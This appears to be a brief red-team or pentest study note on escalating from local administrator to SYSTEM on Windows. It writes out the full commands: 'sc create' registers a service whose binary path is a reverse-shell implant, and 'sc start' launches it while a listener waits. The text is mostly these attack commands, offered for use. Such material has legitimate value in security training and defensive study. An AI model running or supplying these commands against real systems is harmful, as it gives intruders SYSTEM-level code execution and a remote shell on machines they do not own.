# Creating a New Service \(admin to system\)

this method is used for high level integrity to system level integrity privesc so **you must have local admin access**

this is the most simple way toget system from admin access

create a service and specify the path to your reverse shell payload as service binary path:

```text
sc create lol binPath= "c:\RTO\LPE\implant\implant.exe"
```

start a listener and start the service:

```text
sc start lol
```

Done!

